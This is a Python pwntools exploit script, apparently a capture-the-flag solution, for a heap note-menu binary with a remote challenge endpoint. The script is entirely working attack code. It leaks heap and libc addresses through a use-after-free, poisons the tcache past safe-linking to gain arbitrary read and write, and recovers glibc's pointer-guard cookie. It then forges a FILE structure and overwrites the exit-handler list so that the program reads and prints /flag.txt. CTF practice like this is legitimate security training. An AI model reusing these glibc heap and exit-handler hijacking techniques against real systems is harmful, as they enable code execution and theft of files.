from pwn import *
from os.path import expanduser
import builtins
import atexit
import os

context.terminal = ["kitty"]
context.binary = file = ELF("./chall")
libc = ELF("./libc.so.6")

sizes = dict()

def sendlineafter(val, delim=b": "):
    match type(val):
        case builtins.int | builtins.str:
            p.sendlineafter(delim, f"{val}".encode())
        case builtins.bytes:
            p.sendlineafter(delim, val)
def new(idx: int, size: int):
    sendlineafter(1)
    sendlineafter(idx)
    sendlineafter(size)
    sizes[idx] = size
    return idx
def edit(idx: int, data: bytes):
    if len(data) > sizes[idx]:
        log.error(f"data too long")
    data = data.ljust(sizes[idx], b"\x00")
    sendlineafter(2)
    sendlineafter(idx)
    sendlineafter(data)
def kill(idx: int):
    sendlineafter(3)
    sendlineafter(idx)
def view(idx: int):
    sendlineafter(4)
    sendlineafter(idx)
    p.recvuntil(b"Data: ")
    return p.recv(sizes[idx])

gdbscript = """
b *main+0x100
brva 0x000012d0
c
"""
if args.QEMU:
    p = process("./run.sh -g 1234", shell=True)
    for _ in range(3):
        p.recvline()
    open("gdbscript", "w+").write(gdbscript)
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = expanduser("~/.pyenv/versions/3.11.9/lib")
    g = process("kitty gdb-multiarch -ex 'target remote :1234' -x gdbscript ./chall", shell=True, env=env)
    atexit.register(lambda: g.close())
elif args.REMOTE:
    p = remote("0.cloud.chals.io", "33799")
else:
    p = gdb.debug("./chall", gdbscript=gdbscript)

leak = p.recvline()
print(leak)

a = new(0, 0x500)
b = new(1, 0x38)

kill(b)
leak = view(b)
heapbase = u64(leak[:8]) << 12
mangle = heapbase >> 12
log.info(f"{heapbase = :#x}")

kill(a)
leak = view(a)
libcbase = u64(leak[:8]) - 0x1d7d00
log.info(f"{libcbase = :#x}")

a = new(0, 0x300)
b = new(1, 0x300)
kill(a)
kill(b)
edit(b, p64(
    (heapbase + 0x10) ^ mangle
))
tcache = new(0, 0x300)
tcache = new(0, 0x300)

def arbread(addr: int):
    payload = b"".ljust(0x58, b"\x00")
    payload += p64(1 << 48)
    payload = payload.ljust(0x1f8, b"\x00")
    payload += p64(addr)
    edit(tcache, payload)
    fake = new(1, 0x300)
    return view(fake)

def arbwrite(addr: int, data: bytes):
    payload = b"".ljust(0x58, b"\x00")
    payload += p64(1 << 48)
    payload = payload.ljust(0x1f8, b"\x00")
    payload += p64(addr)
    edit(tcache, payload)
    fake = new(1, 0x300)
    edit(fake, data)

offset = -0x28c0 + 0x30
if args.QEMU or args.REMOTE:
    offset = 0x1e6770
leak = arbread(libcbase + offset)
cookie = u64(leak[:8])
log.info(f"{cookie = :#x}")

"""
/* offset      |    size */  type = struct exit_function_list {
/*      0      |       8 */    struct exit_function_list *next;
/*      8      |       8 */    size_t idx;
/*     16      |    1024 */    struct exit_function fns[32];

                               /* total size (bytes): 1040 */
                             }
"""

def func(flavor: int, fn: int, arg: int):
    d = b""
    d += p64(flavor)
    fn ^= cookie
    fn = ((fn << 17) | (fn >> (64 - 17))) % (1 << 64)
    d += p64(fn)
    d += p64(arg)
    d += p64(0)
    return d

"""
/* offset      |    size */  type = struct exit_function {
/*      0      |       8 */    long flavor;
/*      8      |      24 */    union {
/*                     8 */        void (*at)(void);
/*                    16 */        struct {
/*      8      |       8 */            void (*fn)(int, void *);
/*     16      |       8 */            void *arg;

                                       /* total size (bytes):   16 */
                                   } on;
/*                    24 */        struct {
/*      8      |       8 */            void (*fn)(void *, int);
/*     16      |       8 */            void *arg;
/*     24      |       8 */            void *dso_handle;

                                       /* total size (bytes):   24 */
                                   } cxa;
/* XXX 16-byte padding   */

                                   /* total size (bytes):   24 */
                               } func;

                               /* total size (bytes):   32 */
                             }
"""

filename = libcbase + libc.bss()
arbwrite(filename, b"/flag.txt")

contents = libcbase + libc.bss(0x200)

fakefile = libcbase + libc.bss(0x100)
mask = (1 << 64) - 1
payload = FileStructure()
payload.flags = 0xfbad2488
payload._IO_read_ptr = contents + 0x1000
payload._IO_read_end = contents + 0x1000
payload._IO_read_base = contents
payload._IO_write_base = contents
payload._IO_write_ptr = contents
payload._IO_write_end = contents
payload._IO_buf_base = contents
payload._IO_buf_end = contents + 0x1000
payload.fileno = 3
payload._offset = mask
payload._old_offset = 0
payload._lock = libcbase + libc.sym._IO_stdfile_0_lock
payload._wide_data = libcbase + libc.sym._IO_wide_data_0
payload.vtable = libcbase + libc.sym._IO_file_jumps
payload = bytearray(bytes(payload))
payload[192:196] = p32(0xffffffff)
arbwrite(fakefile, bytes(payload))

log.info(f"{fakefile = :#x}")
log.info(f"{contents = :#x}")
log.info(f"{libcbase + libc.sym.fgetc = :#x}")
log.info(f"{libcbase + libc.sym.open = :#x}")

funcs = [
    func(4, libcbase + libc.sym.open, filename),
    func(4, libcbase + libc.sym.fgetc, fakefile),
    func(4, libcbase + libc.sym.puts, contents + 1),
    func(4, libcbase + libc.sym.sleep, 8)
]

payload = p64(0)
payload += p64(len(funcs))
payload += b"".join(reversed(funcs))

log.info(f"{libc.sym.initial = :#x}")
arbwrite(libcbase + libc.sym.initial, payload)

sendlineafter(0)

p.interactive()